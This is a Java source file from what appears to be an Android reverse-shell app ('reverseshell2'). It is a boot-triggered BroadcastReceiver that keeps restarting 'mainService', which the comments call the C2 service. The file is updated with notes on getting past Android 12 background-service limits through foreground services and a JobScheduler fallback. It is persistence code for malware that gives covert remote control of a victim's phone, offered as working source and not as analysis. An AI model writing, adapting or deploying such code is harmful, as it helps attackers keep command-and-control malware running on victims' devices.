package com.example.reverseshell2;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.example.reverseshell2.functions;

/**
 * BroadcastReceiver, updated for Android 12.
 *
 * Changes for Android 12:
 *  1. BACKGROUND SERVICE START RESTRICTION - On Android 12 (API 31), calling
 *     startService() from the background throws IllegalStateException
 *     ("Background service start not allowed"). mainService is now started as a
 *     FOREGROUND service via ContextCompat.startForegroundService(), which is
 *     the correct way to start the C2 service on Android 12.
 *
 *  2. IMPORTANT: mainService MUST call startForeground() within 5 seconds of
 *     startForegroundService(), otherwise the system throws
 *     ForegroundServiceDidNotStartInTimeException. If mainService is NOT
 *     already a foreground service, convert it so it calls startForeground()
 *     in onStartCommand().
 *
 *  3. FALLBACK - If starting the service is blocked (e.g. the app is in a
 *     restricted background state), the code falls back to JobScheduler
 *     (functions.jobScheduler) which is allowed on Android 12.
 *
 *  4. getRunningServices() is deprecated since API 26 and only returns the
 *     CALLING app's own services - which is exactly what this receiver needs,
 *     so it still works. Marked with @SuppressWarnings("deprecation").
 *
 *  5. BOOT_COMPLETED note - Android 12 allows foreground-service starts from
 *     the BOOT_COMPLETED system broadcast, which is the primary trigger for
 *     this receiver.
 */
public class broadcastReciever extends BroadcastReceiver {

    static String TAG = "broadcastRecieverClass";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i(TAG, "Received...");

        if (isMyServiceRunning(context)) {
            Log.v(TAG, "Yeah, it's running, no need to restart service");
        } else {
            Log.v(TAG, "Not running, restarting service");
            restartMainService(context);
        }
    }

    private void restartMainService(Context context) {
        Intent intent = new Intent(context, mainService.class);

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Android 8+: use startForegroundService (mainService must call
                // startForeground() within 5s). This is REQUIRED on Android 12
                // to start the service from the background.
                ContextCompat.startForegroundService(context, intent);
            } else {
                context.startService(intent);
            }
        } catch (IllegalStateException e) {
            // Android 12: "Background service start not allowed" - the system
            // refused the start. Fall back to JobScheduler, which is permitted.
            Log.e(TAG, "startForegroundService blocked on Android 12, using JobScheduler", e);
            try {
                new functions(null).jobScheduler(context);
            } catch (Exception ex) {
                Log.e(TAG, "jobScheduler fallback failed", ex);
            }
        } catch (Exception e) {
            Log.e(TAG, "startForegroundService failed", e);
            try {
                new functions(null).jobScheduler(context);
            } catch (Exception ex) {
                Log.e(TAG, "jobScheduler fallback failed", ex);
            }
        }
    }

    /**
     * Checks if mainService is currently running.
     *
     * Since Android 5.0 (API 21), getRunningServices() only returns services
     * belonging to the CALLING app, which is exactly what we need here. It is
     * deprecated on API 26+ but remains functional for this use case.
     */
    @SuppressWarnings("deprecation")
    private boolean isMyServiceRunning(Context context) {
        try {
            ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (manager == null) {
                return false;
            }
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (service != null && service.service != null
                        && mainService.class.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "getRunningServices blocked", e);
        } catch (Exception e) {
            Log.e(TAG, "getRunningServices failed", e);
        }
        return false;
    }
}

